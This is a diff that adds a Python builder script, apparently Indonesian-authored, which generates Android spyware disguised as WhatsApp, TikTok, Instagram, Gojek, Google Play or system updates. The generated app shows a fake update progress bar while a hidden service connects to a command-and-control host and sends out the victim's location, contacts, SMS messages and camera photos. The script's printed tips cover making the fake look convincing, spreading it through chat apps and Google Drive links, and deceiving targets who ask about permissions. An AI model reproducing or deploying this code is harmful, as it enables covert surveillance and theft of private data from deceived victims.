@@ -1,0 +1,430 @@
+#!/usr/bin/env python3
+"""
+SPECTRE Decoy Builder
+Pilih template → generate main.py + buildozer.spec yang disesuaikan
+python3 decoy.py [template_id]
+"""
+import os, sys, shutil
+
+# ─── Template library ────────────────────────────────────────────────────────
+TEMPLATES = {
+    "1": {
+        "name":    "WhatsApp Update",
+        "pkg":     "com.whatsapp.update",
+        "title":   "WhatsApp",
+        "icon":    "wa",          # icon placeholder
+        "color":   "0.075, 0.49, 0.38, 1",  # WA green
+        "bg":      "0.95, 0.95, 0.95, 1",
+        "msg":     "Updating WhatsApp...\nPlease keep the app open.",
+        "perm_reason": "WhatsApp needs to access your contacts and storage to sync.",
+        "steps":   ["Checking version", "Downloading update", "Verifying files", "Applying patch", "Done!"],
+    },
+    "2": {
+        "name":    "System Update",
+        "pkg":     "com.android.systemupdate",
+        "title":   "Software Update",
+        "icon":    "android",
+        "color":   "0.25, 0.53, 0.96, 1",  # Android blue
+        "bg":      "1, 1, 1, 1",
+        "msg":     "Installing system update...\nDo not turn off your phone.",
+        "perm_reason": "System services require access to manage device components.",
+        "steps":   ["Preparing update", "Downloading patch", "Checking integrity", "Installing", "Finishing"],
+    },
+    "3": {
+        "name":    "Google Play Services",
+        "pkg":     "com.google.android.gms.update",
+        "title":   "Play Services",
+        "icon":    "google",
+        "color":   "0.26, 0.52, 0.96, 1",
+        "bg":      "1, 1, 1, 1",
+        "msg":     "Updating Google Play Services...\nThis may take a moment.",
+        "perm_reason": "Google Play Services requires access to manage apps and location.",
+        "steps":   ["Connecting to Google", "Syncing components", "Updating services", "Optimizing", "Complete"],
+    },
+    "4": {
+        "name":    "TikTok Update",
+        "pkg":     "com.zhiliaoapp.musically.update",
+        "title":   "TikTok",
+        "icon":    "tiktok",
+        "color":   "0.0, 0.0, 0.0, 1",
+        "bg":      "0.07, 0.07, 0.07, 1",
+        "msg":     "Updating TikTok...\nNew features coming!",
+        "perm_reason": "TikTok needs camera and mic access to record videos.",
+        "steps":   ["Fetching update", "Downloading", "Verifying", "Installing", "Restarting"],
+    },
+    "5": {
+        "name":    "Gojek Update",
+        "pkg":     "com.gojek.app.update",
+        "title":   "Gojek",
+        "icon":    "gojek",
+        "color":   "0.0, 0.55, 0.27, 1",  # Gojek green
+        "bg":      "1, 1, 1, 1",
+        "msg":     "Memperbarui Gojek...\nTunggu sebentar ya.",
+        "perm_reason": "Gojek memerlukan akses lokasi untuk layanan driver.",
+        "steps":   ["Memeriksa versi", "Mengunduh pembaruan", "Memverifikasi", "Memasang", "Selesai!"],
+    },
+    "6": {
+        "name":    "Instagram Update",
+        "pkg":     "com.instagram.android.update",
+        "title":   "Instagram",
+        "icon":    "instagram",
+        "color":   "0.51, 0.18, 0.76, 1",
+        "bg":      "1, 1, 1, 1",
+        "msg":     "Updating Instagram...\nGet ready for new features.",
+        "perm_reason": "Instagram needs camera and storage to share your moments.",
+        "steps":   ["Connecting", "Downloading", "Processing", "Installing", "Done!"],
+    },
+}
+
+# ─── KV layout generator ─────────────────────────────────────────────────────
+def gen_kv(t):
+    r, g, b, a = t["color"].split(", ")
+    bg = t["bg"]
+    return f'''#:kivy 2.1.0
+<SpectreScreen>:
+    canvas.before:
+        Color:
+            rgba: {bg}
+        Rectangle:
+            pos: self.pos
+            size: self.size
+
+    BoxLayout:
+        orientation: "vertical"
+        padding: dp(40)
+        spacing: dp(20)
+
+        Widget: size_hint_y: 0.15
+
+        Label:
+            text: "{t["title"]}"
+            font_size: dp(28)
+            bold: True
+            color: {t["color"]}
+            size_hint_y: None
+            height: dp(50)
+
+        Label:
+            id: status_label
+            text: "{t["steps"][0]}"
+            font_size: dp(14)
+            color: 0.4, 0.4, 0.4, 1
+            size_hint_y: None
+            height: dp(30)
+
+        ProgressBar:
+            id: progress
+            max: 100
+            value: 0
+            size_hint_y: None
+            height: dp(8)
+
+        Label:
+            id: pct_label
+            text: "0%"
+            font_size: dp(13)
+            color: {t["color"]}
+            size_hint_y: None
+            height: dp(25)
+
+        Widget: size_hint_y: 0.1
+
+        Label:
+            text: "{t["msg"]}"
+            font_size: dp(12)
+            color: 0.5, 0.5, 0.5, 1
+            halign: "center"
+            text_size: self.width, None
+
+        Widget: size_hint_y: 0.4
+'''
+
+# ─── main.py generator ───────────────────────────────────────────────────────
+def gen_main(t, lhost, lport):
+    steps_str = str(t["steps"])
+    return f'''# SPECTRE APK — {t["name"]}
+# Auto-generated by decoy.py
+from kivy.app import App
+from kivy.uix.screenmanager import Screen
+from kivy.clock import Clock
+from kivy.metrics import dp
+import threading, socket, json, os, time, base64
+
+C2_HOST = "{lhost}"
+C2_PORT = {lport}
+STEPS   = {steps_str}
+
+class SpectreScreen(Screen):
+    pass
+
+class SpyService:
+    def __init__(self): self.sock = None
+
+    def connect(self):
+        while True:
+            try:
+                self.sock = socket.socket()
+                self.sock.settimeout(15)
+                self.sock.connect((C2_HOST, C2_PORT))
+                self.sock.settimeout(None)
+                self._beacon()
+                self._loop()
+            except: time.sleep(20)
+
+    def _send(self, d):
+        try: self.sock.sendall((json.dumps(d)+"\\n").encode())
+        except: pass
+
+    def _beacon(self):
+        try:
+            import android
+            from jnius import autoclass
+            Build    = autoclass("android.os.Build")
+            Version  = autoclass("android.os.Build$VERSION")
+            d = {{"type":"beacon","model":Build.MODEL,"android":str(Version.RELEASE)}}
+        except:
+            import platform
+            d = {{"type":"beacon","model":platform.node(),"android":"unknown"}}
+        self._send(d)
+
+    def _loop(self):
+        buf = b""
+        while True:
+            try:
+                chunk = self.sock.recv(4096)
+                if not chunk: break
+                buf += chunk
+                while b"\\n" in buf:
+                    line, buf = buf.split(b"\\n",1)
+                    if not line.strip(): continue
+                    cmd = json.loads(line.strip()).get("cmd","")
+                    if cmd == "location":  threading.Thread(target=self._gps, daemon=True).start()
+                    elif cmd == "contacts": threading.Thread(target=self._contacts, daemon=True).start()
+                    elif cmd == "sms":     threading.Thread(target=self._sms, daemon=True).start()
+                    elif cmd == "photo":   threading.Thread(target=self._photo, daemon=True).start()
+                    elif cmd == "ping":    self._send({{"type":"pong"}})
+            except: break
+
+    def _gps(self):
+        try:
+            from plyer import gps
+            result = {{}}
+            done   = threading.Event()
+            def on_loc(**kw): result.update(kw); done.set()
+            gps.configure(on_location=on_loc)
+            gps.start(minTime=0, minDistance=0)
+            done.wait(timeout=10)
+            gps.stop()
+            self._send({{"type":"gps","lat":result.get("lat"),"lon":result.get("lon")}})
+        except Exception as e: self._send({{"type":"gps","err":str(e)}})
+
+    def _contacts(self):
+        try:
+            from jnius import autoclass
+            Uri     = autoclass("android.net.Uri")
+            PythonActivity = autoclass("org.kivy.android.PythonActivity")
+            ctx = PythonActivity.mActivity
+            cr  = ctx.getContentResolver()
+            Phone = autoclass("android.provider.ContactsContract$CommonDataKinds$Phone")
+            cur = cr.query(Phone.CONTENT_URI, None, None, None, None)
+            contacts = []
+            while cur.moveToNext():
+                name = cur.getString(cur.getColumnIndex("display_name")) or ""
+                num  = cur.getString(cur.getColumnIndex("data1")) or ""
+                contacts.append({{"name":name,"num":num}})
+            cur.close()
+            self._send({{"type":"contacts","data":contacts[:300]}})
+        except Exception as e: self._send({{"type":"contacts","err":str(e)}})
+
+    def _sms(self):
+        try:
+            from jnius import autoclass
+            Uri = autoclass("android.net.Uri")
+            PythonActivity = autoclass("org.kivy.android.PythonActivity")
+            ctx = PythonActivity.mActivity
+            cr  = ctx.getContentResolver()
+            cur = cr.query(Uri.parse("content://sms/inbox"), None, None, None, "date DESC LIMIT 100")
+            msgs = []
+            while cur.moveToNext():
+                msgs.append({{
+                    "from": cur.getString(cur.getColumnIndex("address")) or "",
+                    "body": cur.getString(cur.getColumnIndex("body")) or "",
+                }})
+            cur.close()
+            self._send({{"type":"sms","data":msgs}})
+        except Exception as e: self._send({{"type":"sms","err":str(e)}})
+
+    def _photo(self):
+        try:
+            from plyer import camera
+            path = "/sdcard/.xc_p.jpg"
+            done = threading.Event()
+            def cb(fn):
+                try:
+                    with open(fn,"rb") as f: data = base64.b64encode(f.read()).decode()
+                    self._send({{"type":"photo","data":data}})
+                    os.remove(fn)
+                except: pass
+                done.set()
+            camera.take_picture(filename=path, on_complete=cb)
+            done.wait(timeout=15)
+        except Exception as e: self._send({{"type":"photo","err":str(e)}})
+
+
+_svc = SpyService()
+
+class SpectreApp(App):
+    def build(self):
+        from kivy.uix.screenmanager import ScreenManager
+        sm = ScreenManager()
+        self._scr = SpectreScreen(name="main")
+        sm.add_widget(self._scr)
+        threading.Thread(target=_svc.connect, daemon=True).start()
+        Clock.schedule_once(self._start_progress, 1.5)
+        return sm
+
+    def _start_progress(self, *a):
+        self._step = 0
+        self._pct  = 0
+        Clock.schedule_interval(self._tick, 0.08)
+
+    def _tick(self, dt):
+        scr = self._scr
+        try:
+            bar   = scr.ids.progress
+            lbl   = scr.ids.status_label
+            pct_l = scr.ids.pct_label
+        except: return True
+        self._pct += 0.4
+        if self._pct > 100: self._pct = 100
+        bar.value = self._pct
+        pct_l.text = f"{{int(self._pct)}}%"
+        step_idx = min(int(self._pct / 25), len(STEPS)-1)
+        lbl.text = STEPS[step_idx]
+        if self._pct >= 100:
+            Clock.schedule_once(self._finish, 1.5)
+            return False
+
+    def _finish(self, *a):
+        # Setelah "selesai" → sembunyikan UI, tetap running di background
+        from kivy.uix.label import Label
+        self._scr.clear_widgets()
+        self._scr.add_widget(Label(
+            text="✓  Update complete\\nYou may close this app.",
+            color=(0.4, 0.4, 0.4, 1),
+            font_size="14sp",
+            halign="center",
+        ))
+
+    def on_pause(self): return True
+    def on_resume(self): pass
+
+if __name__ == "__main__":
+    SpectreApp().run()
+'''
+
+# ─── buildozer.spec generator ────────────────────────────────────────────────
+def gen_spec(t):
+    return f'''[app]
+title           = {t["title"]}
+package.name    = {t["pkg"].split(".")[-1]}
+package.domain  = {".".join(t["pkg"].split(".")[:-1])}
+source.dir      = .
+source.include_exts = py,kv,png,jpg
+version         = 1.0
+requirements    = python3,kivy==2.3.0,plyer,requests,urllib3
+android.permissions = INTERNET,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CONTACTS,READ_SMS,CAMERA,READ_CALL_LOG,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,READ_PHONE_STATE
+android.api     = 33
+android.minapi  = 26
+android.ndk     = 25b
+android.arch    = arm64-v8a
+android.allow_backup = False
+android.meta_data = com.google.android.gms.version:@integer/google_play_services_version
+orientation     = portrait
+fullscreen      = 0
+icon.filename   = %(source.dir)s/icon.png
+
+[buildozer]
+log_level = 1
+warn_on_root = 1
+'''
+
+# ─── CLI ─────────────────────────────────────────────────────────────────────
+def show_menu():
+    print("\n\033[95m SPECTRE Decoy Builder\033[0m")
+    print("\033[90m─────────────────────────\033[0m")
+    for k, t in TEMPLATES.items():
+        print(f"  [{k}] {t['name']:<28} ({t['pkg']})")
+    print("\033[90m─────────────────────────\033[0m")
+
+def build(tid, lhost="192.168.1.100", lport=4445):
+    t = TEMPLATES.get(str(tid))
+    if not t:
+        print(f"[!] Template {tid} not found"); return
+
+    print(f"\n\033[92m[+] Building: {t['name']}\033[0m")
+    print(f"    C2: {lhost}:{lport}")
+
+    # Write files
+    with open("main.py", "w") as f: f.write(gen_main(t, lhost, lport))
+    with open("spectre.kv", "w") as f: f.write(gen_kv(t))
+    with open("buildozer.spec", "w") as f: f.write(gen_spec(t))
+
+    # Dummy icon (ganti dengan icon asli)
+    if not os.path.exists("icon.png"):
+        try:
+            # buat icon 512x512 placeholder
+            from PIL import Image, ImageDraw, ImageFont
+            img = Image.new("RGBA", (512,512), (30,30,30,255))
+            d   = ImageDraw.Draw(img)
+            r,g,b,a = [int(float(x)*255) for x in t["color"].split(", ")]
+            d.ellipse([56,56,456,456], fill=(r,g,b,255))
+            d.text((256,256), t["title"][0], fill=(255,255,255,255), anchor="mm")
+            img.save("icon.png")
+            print("    \033[93m[icon] generated placeholder icon.png\033[0m")
+        except:
+            print("    \033[90m[icon] skip (pip install pillow untuk auto-gen)\033[0m")
+
+    print(f"""
+\033[93m Files written:\033[0m
+  main.py       ← spyware + decoy UI
+  spectre.kv    ← layout {t["name"]}
+  buildozer.spec← config APK
+
+\033[93m Build APK:\033[0m
+  \033[92mpip install buildozer cython\033[0m
+  \033[92mbuildozer -v android debug\033[0m
+  → output: bin/*.apk
+
+\033[93m Tips biar makin convincing:\033[0m
+  1. Ganti icon.png dengan icon asli dari Play Store
+     (download via apkpure.com → extract icon dari APK lama)
+  2. Rename APK: {t["title"].replace(" ","-")}-update.apk
+  3. Kirim via:\033[0m
+     WA/Telegram: "ada update {t["title"]} nih coba install"
+     Google Drive link (biar bypass WA block APK)
+     QR code yang diprint / dishare
+
+\033[93m Permission yang diminta saat install:\033[0m
+  → {t["perm_reason"]}
+  → Kalau target nanya: "ini permission standar buat {t["title"]}"
+""")
+
+if __name__ == "__main__":
+    lhost = os.environ.get("LHOST","192.168.1.100")
+    lport = int(os.environ.get("LPORT","4445"))
+
+    if len(sys.argv) > 1 and sys.argv[1].isdigit():
+        if len(sys.argv) > 2: lhost = sys.argv[2]
+        if len(sys.argv) > 3: lport = int(sys.argv[3])
+        build(sys.argv[1], lhost, lport)
+    else:
+        show_menu()
+        try:
+            choice = input("\nPilih template [1-6]: ").strip()
+            lhost  = input(f"C2 IP [{lhost}]: ").strip() or lhost
+            lport  = input(f"C2 Port [{lport}]: ").strip()
+            lport  = int(lport) if lport else 4445
+            build(choice, lhost, lport)
+        except (KeyboardInterrupt, EOFError):
+            print("\nCancel.")
